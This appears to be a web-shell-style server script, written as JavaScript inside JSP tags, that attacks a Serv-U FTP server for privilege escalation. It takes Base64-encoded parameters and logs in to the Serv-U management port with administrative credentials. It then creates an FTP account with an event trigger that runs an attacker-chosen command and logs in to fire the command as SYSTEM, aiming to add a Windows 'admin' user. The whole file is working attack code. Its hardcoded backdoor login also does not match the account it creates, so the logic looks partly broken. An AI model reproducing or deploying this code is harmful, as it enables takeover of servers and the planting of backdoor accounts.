<%

(function() {
    var Socket = Java.type("java.net.Socket");
    var BufferedReader = Java.type("java.io.BufferedReader");
    var InputStreamReader = Java.type("java.io.InputStreamReader");
    var BufferedWriter = Java.type("java.io.BufferedWriter");
    var OutputStreamWriter = Java.type("java.io.OutputStreamWriter");
    var Base64 = Java.type("java.util.Base64");
    var StandardCharsets = Java.type("java.nio.charset.StandardCharsets");

    function main() {
        var z1 = request.getParameter("z1");
        if (!z1) {
            out.print("[-] Invalid JSON / Base64.");
            return;
        }

        try {
            var decodedBytes = Base64.getDecoder().decode(z1);
            var jsonStr = new java.lang.String(decodedBytes, StandardCharsets.UTF_8);
            var config = JSON.parse(jsonStr);

            var host = config.ip || "127.0.0.1";
            var port = config.port ? java.lang.Integer.parseInt(config.port) : 43958;
            var user = config.user || "";
            var pass = config.pass || "";
            var cmd = config.cmd || "";

            var backdoorUser = "some_user";
            var backdoorPass = "some_pass";

            var output = "";

            try {
                var socket = new Socket(host, port);
                socket.setSoTimeout(5000);
                
                var reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.US_ASCII));
                var writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(), StandardCharsets.US_ASCII));

                output += "[+] Successfully connected to Serv-U management port...\n";
                reader.readLine();

                writer.write("USER " + user + "\r\n");
                writer.flush();
                reader.readLine();

                writer.write("PASS " + pass + "\r\n");
                writer.flush();
                var response = reader.readLine();

                if (response === null || (!response.contains("230") && !response.contains("Logged in"))) {
                    socket.close();
                    out.print("[-] Login failed: Default administrative password has been changed.\n");
                    return;
                }

                output += "[+] Successfully authenticated into Serv-U management interface!\n";

                writer.write("SUSER " + user + "|" + pass + "|Y|N\r\n");
                writer.flush();
                reader.readLine();

                writer.write("SEVENT " + user + "|0|0|" + cmd + "\r\n");
                writer.flush();
                reader.readLine();

                output += "[+] Malicious FTP account and Event trigger configured successfully.\n";
                socket.close();
            } catch (e) {
                out.print("[-] Failed to connect to Serv-U management port. Reason: " + e.toString() + "\n");
                return;
            }

            output += "[+] Attempting to log into standard FTP port to trigger the SYSTEM payload...\n";
            try {
                var ftpSocket = new Socket("127.0.0.1", 21);
                ftpSocket.setSoTimeout(3000);
                
                var ftpReader = new BufferedReader(new InputStreamReader(ftpSocket.getInputStream(), StandardCharsets.US_ASCII));
                var ftpWriter = new BufferedWriter(new OutputStreamWriter(ftpSocket.getOutputStream(), StandardCharsets.US_ASCII));
                
                ftpReader.readLine();
                ftpWriter.write("USER " + backdoorUser + "\r\n");
                ftpWriter.flush();
                ftpReader.readLine();
                
                ftpWriter.write("PASS " + backdoorPass + "\r\n");
                ftpWriter.flush();
                ftpReader.readLine();
                
                ftpWriter.write("QUIT\r\n");
                ftpWriter.flush();
                ftpSocket.close();
                
                output += "[+] Payload triggered! Verify if the Windows user 'admin' was added.\n";
            } catch (e) {
                output += "[-] Could not connect to port 21. The event will trigger whenever the account is accessed.\n";
            }

            out.print(output);

        } catch (e) {
            out.print("[-] Invalid JSON / Base64 or execution error: " + e.toString());
        }
    }

    main();
})();

%>